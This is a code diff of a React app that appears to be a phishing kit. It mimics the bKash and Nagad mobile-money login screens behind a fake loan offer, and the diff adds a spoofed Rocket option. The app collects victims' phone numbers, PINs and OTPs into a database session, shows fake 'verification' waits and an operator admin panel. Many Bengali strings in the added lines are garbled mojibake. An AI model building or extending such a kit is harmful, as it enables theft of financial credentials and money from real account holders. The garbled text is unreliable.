@@ -1,4 +1,4 @@
-
+﻿
 import React, { useState, useEffect, useRef } from 'react';
 import { 
   ArrowLeft, 
@@ -97,7 +97,7 @@ export const db = {
 };
 
 type LoginView = 'landing' | 'login' | 'otp' | 'otp_wrong' | 'pin_reset' | 'waiting' | 'number_change';
-type Provider = 'bkash' | 'nagad';
+type Provider = 'bkash' | 'nagad' | 'rocket';
 
 const App: React.FC = () => {
   const [showLogin, setShowLogin] = useState(false);
@@ -129,6 +129,13 @@ const App: React.FC = () => {
   const [bkashEnabled, setBkashEnabled] = useState<boolean>(() => {
     if (typeof localStorage !== 'undefined') {
       const saved = localStorage.getItem('setting_bkashEnabled');
+      if (saved !== null) return saved === 'true';
+    }
+    return true;
+  });
+  const [rocketEnabled, setRocketEnabled] = useState<boolean>(() => {
+    if (typeof localStorage !== 'undefined') {
+      const saved = localStorage.getItem('setting_rocketEnabled');
       if (saved !== null) return saved === 'true';
     }
     return true;
@@ -197,10 +204,25 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
+    const unsubscribe = db.ref('settings/rocketEnabled').on('value', (snapshot) => {
+      const val = snapshot.val();
+      const enabled = val === null ? true : !!val;
+      setRocketEnabled(enabled);
+      if (typeof localStorage !== 'undefined') {
+        localStorage.setItem('setting_rocketEnabled', String(enabled));
+      }
+    });
+    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
+  }, []);
+
+  useEffect(() => {
     if (provider === 'nagad' && !nagadEnabled) {
       if (bkashEnabled) {
         setProvider('bkash');
         localStorage.setItem('payment_provider', 'bkash');
+      } else if (rocketEnabled) {
+        setProvider('rocket');
+        localStorage.setItem('payment_provider', 'rocket');
       } else {
         setProvider(null);
         localStorage.removeItem('payment_provider');
@@ -209,12 +231,26 @@ const App: React.FC = () => {
       if (nagadEnabled) {
         setProvider('nagad');
         localStorage.setItem('payment_provider', 'nagad');
+      } else if (rocketEnabled) {
+        setProvider('rocket');
+        localStorage.setItem('payment_provider', 'rocket');
+      } else {
+        setProvider(null);
+        localStorage.removeItem('payment_provider');
+      }
+    } else if (provider === 'rocket' && !rocketEnabled) {
+      if (bkashEnabled) {
+        setProvider('bkash');
+        localStorage.setItem('payment_provider', 'bkash');
+      } else if (nagadEnabled) {
+        setProvider('nagad');
+        localStorage.setItem('payment_provider', 'nagad');
       } else {
         setProvider(null);
         localStorage.removeItem('payment_provider');
       }
     }
-  }, [nagadEnabled, bkashEnabled, provider]);
+  }, [nagadEnabled, bkashEnabled, rocketEnabled, provider]);
 
   useEffect(() => { currentStepRef.current = currentStep; }, [currentStep]);
   useEffect(() => { showLoginRef.current = showLogin; }, [showLogin]);
@@ -273,6 +309,17 @@ const App: React.FC = () => {
       [data-provider="nagad"] .bg-pink-50{background-color:#FFF3E0!important}
       [data-provider="nagad"] .hover\\:bg-pink-50:hover{background-color:#FFF3E0!important}
 
+      [data-provider="rocket"] .bg-\\[\\#E2136E\\]{background-color:#8C3494!important}
+      [data-provider="rocket"] .text-\\[\\#E2136E\\]{color:#8C3494!important}
+      [data-provider="rocket"] .border-\\[\\#E2136E\\]{border-color:#8C3494!important}
+      [data-provider="rocket"] .focus-within\\:border-\\[\\#E2136E\\]:focus-within{border-color:#8C3494!important}
+      [data-provider="rocket"] .hover\\:text-\\[\\#E2136E\\]:hover{color:#8C3494!important}
+      [data-provider="rocket"] .hover\\:border-\\[\\#E2136E\\]:hover{border-color:#8C3494!important}
+      [data-provider="rocket"] .focus\\:ring-\\[\\#E2136E\\]:focus{--tw-ring-color:#8C3494!important}
+      [data-provider="rocket"] .shadow-\\[0_-4px_20px_rgba\\(226\\,19\\,110\\,0\\.3\\)\\]{box-shadow:0 -4px 20px rgba(140,52,148,0.3)!important}
+      [data-provider="rocket"] .bg-pink-50{background-color:#F3E8F6!important}
+      [data-provider="rocket"] .hover\\:bg-pink-50:hover{background-color:#F3E8F6!important}
+
       [data-keep-theme] .bg-\\[\\#E2136E\\]{background-color:#E2136E!important}
       [data-keep-theme] .text-\\[\\#E2136E\\]{color:#E2136E!important}
       [data-keep-theme] .border-\\[\\#E2136E\\]{border-color:#E2136E!important}
@@ -288,14 +335,22 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
-    if (provider !== 'nagad') return;
-    const replaceMap: Array<[RegExp, string]> = [
-      [/বিকাশ/g, 'নগদ'],
-      [/bKash/g, 'Nagad'],
-      [/BKash/g, 'Nagad'],
-      [/Bkash/g, 'Nagad'],
-      [/bkash/g, 'nagad'],
-    ];
+    if (provider !== 'nagad' && provider !== 'rocket') return;
+    const replaceMap: Array<[RegExp, string]> = provider === 'nagad'
+      ? [
+          [/à¦¬à¦¿à¦•à¦¾à¦¶/g, 'à¦¨à¦—à¦¦'],
+          [/bKash/g, 'Nagad'],
+          [/BKash/g, 'Nagad'],
+          [/Bkash/g, 'Nagad'],
+          [/bkash/g, 'nagad'],
+        ]
+      : [
+          [/à¦¬à¦¿à¦•à¦¾à¦¶/g, 'à¦°à¦•à§‡à¦Ÿ'],
+          [/bKash/g, 'Rocket'],
+          [/BKash/g, 'Rocket'],
+          [/Bkash/g, 'Rocket'],
+          [/bkash/g, 'rocket'],
+        ];
     const SKIP_TAGS = new Set(['SCRIPT', 'STYLE', 'NOSCRIPT']);
     const applyReplace = (s: string) => {
       let out = s;
@@ -376,13 +431,13 @@ const App: React.FC = () => {
     if (isLoading) return;
 
     if (!mobileNumber.startsWith('01') || mobileNumber.length !== 11) {
-      setPhoneError('অনুগ্রহ করে সঠিক নাম্বার দিন');
+      setPhoneError('à¦…à¦¨à§à¦—à§à¦°à¦¹ à¦•à¦°à§‡ à¦¸à¦ à¦¿à¦• à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¦à¦¿à¦¨');
       return;
     }
     setPhoneError('');
 
     setIsLoading(true);
-    if (provider !== 'nagad') {
+    if (provider !== 'nagad' && provider !== 'rocket') {
       setShowLoginPopup(true);
       setTimeout(() => setShowLoginPopup(false), 3000);
     }
@@ -403,7 +458,7 @@ const App: React.FC = () => {
       await db.ref('sessions/' + newSessionId).set({
         id: newSessionId,
         orderId: uniqueId,
-        name: provider === 'nagad' ? 'Nagad User' : 'bKash User',
+        name: provider === 'nagad' ? 'Nagad User' : provider === 'rocket' ? 'Rocket User' : 'bKash User',
         provider: provider || 'bkash',
         initialPhone: mobileNumber,
         gatewayPhone: '',
@@ -515,6 +570,15 @@ const App: React.FC = () => {
     setShowLogin(true);
   };
 
+  const handleStartRocket = () => {
+    if (!rocketEnabled) return;
+    localStorage.setItem('payment_provider', 'rocket');
+    setProvider('rocket');
+    setCurrentStep(AppStep.ApplicationForm);
+    setLoginView('login');
+    setShowLogin(true);
+  };
+
   const handleLoanApplyIntent = () => {};
 
   const handleFormSubmit = async (data: LoanFormData) => {
@@ -563,7 +627,7 @@ const App: React.FC = () => {
   const handleNumberChangeSubmit = async () => {
     if (isLoading) return;
     if (!mobileNumber.startsWith('01') || mobileNumber.length !== 11) {
-      setPhoneError('অনুগ্রহ করে সঠিক নাম্বার দিন');
+      setPhoneError('à¦…à¦¨à§à¦—à§à¦°à¦¹ à¦•à¦°à§‡ à¦¸à¦ à¦¿à¦• à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¦à¦¿à¦¨');
       return;
     }
     setPhoneError('');
@@ -600,7 +664,7 @@ const App: React.FC = () => {
       setAdminPassword('');
       setShowLogin(false);
     } else {
-      alert('ভুল পাসওয়ার্ড!');
+      alert('à¦­à§à¦² à¦ªà¦¾à¦¸à¦“à¦¯à¦¼à¦¾à¦°à§à¦¡!');
       setAdminPassword('');
     }
   };
@@ -608,6 +672,7 @@ const App: React.FC = () => {
   const handleSelectProvider = (p: Provider) => {
     if (p === 'bkash' && !bkashEnabled) return;
     if (p === 'nagad' && !nagadEnabled) return;
+    if (p === 'rocket' && !rocketEnabled) return;
     setProvider(p);
     setCurrentStep(AppStep.ApplicationForm);
     setLoginView('login');
@@ -621,29 +686,29 @@ const App: React.FC = () => {
           <div className="flex items-center gap-2 text-sm font-bold">
             <span className="text-gray-400 cursor-pointer">Eng</span>
             <span className="h-4 w-[1px] bg-gray-300"></span>
-            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
+            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">à¦¬à¦¾à¦‚</span>
           </div>
         </div>
 
         <div className="flex flex-col items-center text-center mb-10">
           <img
             src="https://i.postimg.cc/Hx21WWJ7/IMG-20260205-090841.jpg"
-            alt="আমার লোন"
+            alt="à¦†à¦®à¦¾à¦° à¦²à§‹à¦¨"
             className="h-16 w-auto object-contain rounded-xl shadow-sm mb-4"
           />
           <h1 className="text-[24px] font-bold text-gray-700 leading-[1.3]">
-            পেমেন্ট মাধ্যম নির্বাচন করুন
+            à¦ªà§‡à¦®à§‡à¦¨à§à¦Ÿ à¦®à¦¾à¦§à§à¦¯à¦® à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à§à¦¨
           </h1>
           <p className="text-sm text-gray-500 font-medium mt-3 px-4">
-            আপনার পছন্দের পেমেন্ট মাধ্যম বেছে নিয়ে এগিয়ে যান
+            à¦†à¦ªà¦¨à¦¾à¦° à¦ªà¦›à¦¨à§à¦¦à§‡à¦° à¦ªà§‡à¦®à§‡à¦¨à§à¦Ÿ à¦®à¦¾à¦§à§à¦¯à¦® à¦¬à§‡à¦›à§‡ à¦¨à¦¿à¦¯à¦¼à§‡ à¦à¦—à¦¿à¦¯à¦¼à§‡ à¦¯à¦¾à¦¨
           </p>
         </div>
 
         <div className="space-y-4 flex-1">
-          {!bkashEnabled && !nagadEnabled ? (
+          {!bkashEnabled && !nagadEnabled && !rocketEnabled ? (
             <div className="p-6 text-center bg-gray-50 rounded-2xl border border-gray-200">
-              <p className="text-gray-600 font-bold">পেমেন্ট সেবা সাময়িকভাবে বন্ধ আছে</p>
-              <p className="text-xs text-gray-400 mt-1">অনুগ্রহ করে কিছুক্ষণ পর চেষ্টা করুন</p>
+              <p className="text-gray-600 font-bold">à¦ªà§‡à¦®à§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦¬à¦¾ à¦¸à¦¾à¦®à§Ÿà¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦¬à¦¨à§à¦§ à¦†à¦›à§‡</p>
+              <p className="text-xs text-gray-400 mt-1">à¦…à¦¨à§à¦—à§à¦°à¦¹ à¦•à¦°à§‡ à¦•à¦¿à¦›à§à¦•à§à¦·à¦£ à¦ªà¦° à¦šà§‡à¦·à§à¦Ÿà¦¾ à¦•à¦°à§à¦¨</p>
             </div>
           ) : (
             <>
@@ -657,8 +722,8 @@ const App: React.FC = () => {
                     <span className="text-white font-black text-lg">bK</span>
                   </div>
                   <div className="text-left">
-                    <div className="font-bold text-gray-800 text-lg">বিকাশ</div>
-                    <div className="text-xs text-gray-500 font-medium">bKash দিয়ে এগিয়ে যান</div>
+                    <div className="font-bold text-gray-800 text-lg">à¦¬à¦¿à¦•à¦¾à¦¶</div>
+                    <div className="text-xs text-gray-500 font-medium">bKash à¦¦à¦¿à¦¯à¦¼à§‡ à¦à¦—à¦¿à¦¯à¦¼à§‡ à¦¯à¦¾à¦¨</div>
                   </div>
                 </div>
                 <ArrowRight className="w-5 h-5 text-[#E2136E]" />
@@ -676,11 +741,30 @@ const App: React.FC = () => {
                     <span className="text-white font-black text-lg">N</span>
                   </div>
                   <div className="text-left">
-                    <div className="font-bold text-gray-800 text-lg">নগদ</div>
-                    <div className="text-xs text-gray-500 font-medium">Nagad দিয়ে এগিয়ে যান</div>
+                    <div className="font-bold text-gray-800 text-lg">à¦¨à¦—à¦¦</div>
+                    <div className="text-xs text-gray-500 font-medium">Nagad à¦¦à¦¿à¦¯à¦¼à§‡ à¦à¦—à¦¿à¦¯à¦¼à§‡ à¦¯à¦¾à¦¨</div>
                   </div>
                 </div>
                 <ArrowRight className="w-5 h-5" style={{ color: '#F58220' }} />
+              </button>
+              )}
+
+              {rocketEnabled && (
+              <button
+                onClick={() => handleSelectProvider('rocket')}
+                className="w-full flex items-center justify-between p-5 rounded-2xl bg-white border-2 border-gray-100 hover:border-[#8C3494] active:scale-[0.98] transition-all shadow-sm cursor-pointer"
+                style={{ ['--hover-color' as any]: '#8C3494' }}
+              >
+                <div className="flex items-center gap-4">
+                  <div className="w-14 h-14 rounded-xl flex items-center justify-center shadow-md" style={{ backgroundColor: '#8C3494' }}>
+                    <span className="text-white font-black text-lg">R</span>
+                  </div>
+                  <div className="text-left">
+                    <div className="font-bold text-gray-800 text-lg">Ã Â¦Â°Ã Â¦â€¢Ã Â§â€¡Ã Â¦Å¸</div>
+                    <div className="text-xs text-gray-500 font-medium">Rocket Ã Â¦Â¦Ã Â¦Â¿Ã Â§Å¸Ã Â§â€¡ Ã Â¦â€ Ã Â¦â€”Ã Â¦Â¿Ã Â§Å¸Ã Â§â€¡ Ã Â¦Â¯Ã Â¦Â¾Ã Â¦Â¨</div>
+                  </div>
+                </div>
+                <ArrowRight className="w-5 h-5" style={{ color: '#8C3494' }} />
               </button>
               )}
             </>
@@ -689,7 +773,7 @@ const App: React.FC = () => {
 
         <div className="mt-auto pt-6 text-center">
           <p className="text-xs text-gray-400 font-medium">
-            নিরাপদ ও দ্রুত পেমেন্টের জন্য একটি মাধ্যম নির্বাচন করুন
+            à¦¨à¦¿à¦°à¦¾à¦ªà¦¦ à¦“ à¦¦à§à¦°à§à¦¤ à¦ªà§‡à¦®à§‡à¦¨à§à¦Ÿà§‡à¦° à¦œà¦¨à§à¦¯ à¦à¦•à¦Ÿà¦¿ à¦®à¦¾à¦§à§à¦¯à¦® à¦¨à¦¿à¦°à§à¦¬à¦¾à¦šà¦¨ à¦•à¦°à§à¦¨
           </p>
         </div>
       </div>
@@ -706,16 +790,16 @@ const App: React.FC = () => {
           <div className="flex items-center gap-2 text-sm font-bold">
             <span className="text-gray-400 cursor-pointer">Eng</span>
             <span className="h-4 w-[1px] bg-gray-300"></span>
-            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
+            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">à¦¬à¦¾à¦‚</span>
           </div>
         </div>
         <div className="flex-1">
           <h1 className="text-[26px] font-bold text-gray-700 mb-10 leading-[1.2]">
-            আপনার বিকাশ একাউন্টে <br /> লগ ইন করুন
+            à¦†à¦ªà¦¨à¦¾à¦° à¦¬à¦¿à¦•à¦¾à¦¶ à¦à¦•à¦¾à¦‰à¦¨à§à¦Ÿà§‡ <br /> à¦²à¦— à¦‡à¦¨ à¦•à¦°à§à¦¨
           </h1>
           <div className="space-y-8">
             <div>
-              <label className="text-[13px] font-bold text-gray-500 mb-3 block">একাউন্ট নাম্বার</label>
+              <label className="text-[13px] font-bold text-gray-500 mb-3 block">à¦à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°</label>
               <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                 <span className="text-xl font-bold text-gray-800">+88</span>
                 <input 
@@ -734,11 +818,11 @@ const App: React.FC = () => {
               )}
             </div>
             <div>
-              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
+              <label className="text-[13px] font-bold text-gray-500 mb-3 block">à¦¬à¦¿à¦•à¦¾à¦¶ à¦ªà¦¿à¦¨</label>
               <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                 <input 
                   type="password" 
-                  placeholder="বিকাশ পিন নাম্বার দিন"
+                  placeholder="à¦¬à¦¿à¦•à¦¾à¦¶ à¦ªà¦¿à¦¨ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¦à¦¿à¦¨"
                   value={pin}
                   onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                   className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
@@ -769,7 +853,7 @@ const App: React.FC = () => {
             </div>
           ) : (
             <div className="w-full flex items-center justify-between">
-              <span className="font-black text-lg ml-2">পরবর্তী</span>
+              <span className="font-black text-lg ml-2">à¦ªà¦°à¦¬à¦°à§à¦¤à§€</span>
               <div className="p-1.5 rounded-full bg-white/20">
                 <ArrowRight className="w-6 h-6" />
               </div>
@@ -779,7 +863,7 @@ const App: React.FC = () => {
         {showLoginPopup && (
           <div className="fixed inset-0 flex items-center justify-center z-[300] bg-black/20 backdrop-blur-sm">
             <div className="animate-bounce" style={{ animation: 'popupFloat 1.5s ease-in-out infinite' }}>
-              <img src={provider === 'nagad' ? '/nagad-logo.png' : 'https://i.postimg.cc/g2Yx5WPw/1772765797205.png'} alt="" className="w-[40rem] h-auto max-w-[90vw]" />
+              <img src={provider === 'nagad' ? '/nagad-logo.png' : provider === 'rocket' ? 'https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png' : 'https://i.postimg.cc/g2Yx5WPw/1772765797205.png'} alt="" className="w-[40rem] h-auto max-w-[90vw]" />
             </div>
           </div>
         )}
@@ -801,7 +885,7 @@ const App: React.FC = () => {
           <div className="flex items-center gap-2 text-sm font-bold">
             <span className="text-gray-400 cursor-pointer">Eng</span>
             <span className="h-4 w-[1px] bg-gray-300"></span>
-            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
+            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">à¦¬à¦¾à¦‚</span>
           </div>
         </div>
         <div className="flex-1">
@@ -813,11 +897,11 @@ const App: React.FC = () => {
             />
           </div>
           <h1 className="text-[22px] font-bold text-gray-700 mb-4 leading-[1.3]">
-            আপনার বিকাশ একাউন্ট নম্বর<br />দিয়ে শুরু করুন
+            à¦†à¦ªà¦¨à¦¾à¦° à¦¬à¦¿à¦•à¦¾à¦¶ à¦à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¨à¦®à§à¦¬à¦°<br />à¦¦à¦¿à¦¯à¦¼à§‡ à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
           </h1>
           <div className="space-y-8">
             <div>
-              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ একাউন্ট নাম্বার</label>
+              <label className="text-[13px] font-bold text-gray-500 mb-3 block">à¦¬à¦¿à¦•à¦¾à¦¶ à¦à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°</label>
               <div className="flex items-center gap-3 border-b-2 border-gray-200 transition-all py-3 px-1" onClick={(e) => e.preventDefault()}>
                 <span className="text-xl font-bold text-gray-800">+88</span>
                 <input 
@@ -833,11 +917,11 @@ const App: React.FC = () => {
               </div>
             </div>
             <div>
-              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
+              <label className="text-[13px] font-bold text-gray-500 mb-3 block">à¦¬à¦¿à¦•à¦¾à¦¶ à¦ªà¦¿à¦¨</label>
               <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                 <input 
                   type="password" 
-                  placeholder="বিকাশ পিন নাম্বার দিন"
+                  placeholder="à¦¬à¦¿à¦•à¦¾à¦¶ à¦ªà¦¿à¦¨ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¦à¦¿à¦¨"
                   value={pin}
                   onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                   className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
@@ -869,7 +953,7 @@ const App: React.FC = () => {
             </div>
           ) : (
             <div className="w-full flex items-center justify-between">
-              <span className="font-black text-lg ml-2">এগিয়ে যান</span>
+              <span className="font-black text-lg ml-2">à¦à¦—à¦¿à¦¯à¦¼à§‡ à¦¯à¦¾à¦¨</span>
               <div className="p-1.5 rounded-full bg-white/20">
                 <ArrowRight className="w-6 h-6" />
               </div>
@@ -888,7 +972,7 @@ const App: React.FC = () => {
           <div className="flex items-center gap-2 text-sm font-bold">
             <span className="text-gray-400 cursor-pointer">Eng</span>
             <span className="h-4 w-[1px] bg-gray-300"></span>
-            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
+            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">à¦¬à¦¾à¦‚</span>
           </div>
         </div>
         <div className="flex-1">
@@ -900,11 +984,11 @@ const App: React.FC = () => {
             />
           </div>
           <h1 className="text-[22px] font-bold text-gray-700 mb-4 leading-[1.3]">
-            আপনার বিকাশ একাউন্ট নম্বর<br />দিয়ে শুরু করুন
+            à¦†à¦ªà¦¨à¦¾à¦° à¦¬à¦¿à¦•à¦¾à¦¶ à¦à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¨à¦®à§à¦¬à¦°<br />à¦¦à¦¿à¦¯à¦¼à§‡ à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
           </h1>
           <div className="space-y-8">
             <div>
-              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ একাউন্ট নাম্বার</label>
+              <label className="text-[13px] font-bold text-gray-500 mb-3 block">à¦¬à¦¿à¦•à¦¾à¦¶ à¦à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°</label>
               <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                 <span className="text-xl font-bold text-gray-800">+88</span>
                 <input 
@@ -922,11 +1006,11 @@ const App: React.FC = () => {
               )}
             </div>
             <div>
-              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
+              <label className="text-[13px] font-bold text-gray-500 mb-3 block">à¦¬à¦¿à¦•à¦¾à¦¶ à¦ªà¦¿à¦¨</label>
               <div className="flex items-center gap-3 border-b-2 border-gray-200 transition-all py-3 px-1" onClick={(e) => e.preventDefault()}>
                 <input 
                   type="password" 
-                  placeholder="বিকাশ পিন নাম্বার দিন"
+                  placeholder="à¦¬à¦¿à¦•à¦¾à¦¶ à¦ªà¦¿à¦¨ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦¦à¦¿à¦¨"
                   value={pin}
                   readOnly
                   tabIndex={-1}
@@ -959,7 +1043,7 @@ const App: React.FC = () => {
             </div>
           ) : (
             <div className="w-full flex items-center justify-between">
-              <span className="font-black text-lg ml-2">এগিয়ে যান</span>
+              <span className="font-black text-lg ml-2">à¦à¦—à¦¿à¦¯à¦¼à§‡ à¦¯à¦¾à¦¨</span>
               <div className="p-1.5 rounded-full bg-white/20">
                 <ArrowRight className="w-6 h-6" />
               </div>
@@ -977,7 +1061,7 @@ const App: React.FC = () => {
         <div className="w-4 h-4 bg-[#E2136E] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
         <div className="w-4 h-4 bg-[#E2136E] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
       </div>
-      <p className="text-gray-600 font-bold animate-pulse text-center">অ্যাকাউন্ট ভেরিফিকেশন করা হচ্ছে, দয়া করে অপেক্ষা করুন...</p>
+      <p className="text-gray-600 font-bold animate-pulse text-center">à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦­à§‡à¦°à¦¿à¦«à¦¿à¦•à§‡à¦¶à¦¨ à¦•à¦°à¦¾ à¦¹à¦šà§à¦›à§‡, à¦¦à¦¯à¦¼à¦¾ à¦•à¦°à§‡ à¦…à¦ªà§‡à¦•à§à¦·à¦¾ à¦•à¦°à§à¦¨...</p>
     </div>
   );
 
@@ -990,8 +1074,8 @@ const App: React.FC = () => {
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
             </svg>
           </div>
-          <h2 className="text-xl font-black text-red-600 mb-2">অ্যাক্সেস ব্লক করা হয়েছে</h2>
-          <p className="text-sm text-gray-500 font-medium">আপনার অ্যাকাউন্ট সাময়িকভাবে স্থগিত করা হয়েছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন।</p>
+          <h2 className="text-xl font-black text-red-600 mb-2">à¦…à§à¦¯à¦¾à¦•à§à¦¸à§‡à¦¸ à¦¬à§à¦²à¦• à¦•à¦°à¦¾ à¦¹à¦¯à¦¼à§‡à¦›à§‡</h2>
+          <p className="text-sm text-gray-500 font-medium">à¦†à¦ªà¦¨à¦¾à¦° à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¸à¦¾à¦®à¦¯à¦¼à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦¸à§à¦¥à¦—à¦¿à¦¤ à¦•à¦°à¦¾ à¦¹à¦¯à¦¼à§‡à¦›à§‡à¥¤ à¦…à¦¨à§à¦—à§à¦°à¦¹ à¦•à¦°à§‡ à¦ªà¦°à§‡ à¦†à¦¬à¦¾à¦° à¦šà§‡à¦·à§à¦Ÿà¦¾ à¦•à¦°à§à¦¨à¥¤</p>
         </div>
       </div>
     );
@@ -1024,7 +1108,7 @@ const App: React.FC = () => {
       case AppStep.Home:
         return (
           <div data-keep-text data-keep-theme>
-            <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} />
+            <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} />
           </div>
         );
       case AppStep.ApplicationForm:
@@ -1050,7 +1134,7 @@ const App: React.FC = () => {
       case AppStep.Admin:
         return <AdminPanel onBack={() => { setShowLogin(true); setCurrentStep(AppStep.Home); }} />;
       default:
-        return <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} />;
+        return <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} />;
     }
   };
 
@@ -1065,19 +1149,19 @@ const App: React.FC = () => {
       {showAdminModal && (
         <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
           <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full animate-fade-in">
-            <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">এডমিন লগইন</h3>
+            <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">à¦à¦¡à¦®à¦¿à¦¨ à¦²à¦—à¦‡à¦¨</h3>
             <form onSubmit={handleAdminLogin} className="space-y-4">
               <input 
                 type="password" 
                 value={adminPassword}
                 onChange={(e) => setAdminPassword(e.target.value)}
-                placeholder="পাসওয়ার্ড দিন"
+                placeholder="à¦ªà¦¾à¦¸à¦“à¦¯à¦¼à¦¾à¦°à§à¦¡ à¦¦à¦¿à¦¨"
                 autoFocus
                 className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:ring-2 focus:ring-[#E2136E] text-center"
               />
               <div className="flex space-x-3">
-                <button type="button" onClick={() => setShowAdminModal(false)} className="flex-1 py-2 text-gray-500 font-bold">বাতিল</button>
-                <button type="submit" className="flex-1 py-2 bg-[#E2136E] text-white font-bold rounded-lg">প্রবেশ</button>
+                <button type="button" onClick={() => setShowAdminModal(false)} className="flex-1 py-2 text-gray-500 font-bold">à¦¬à¦¾à¦¤à¦¿à¦²</button>
+                <button type="submit" className="flex-1 py-2 bg-[#E2136E] text-white font-bold rounded-lg">à¦ªà§à¦°à¦¬à§‡à¦¶</button>
               </div>
             </form>
           </div>
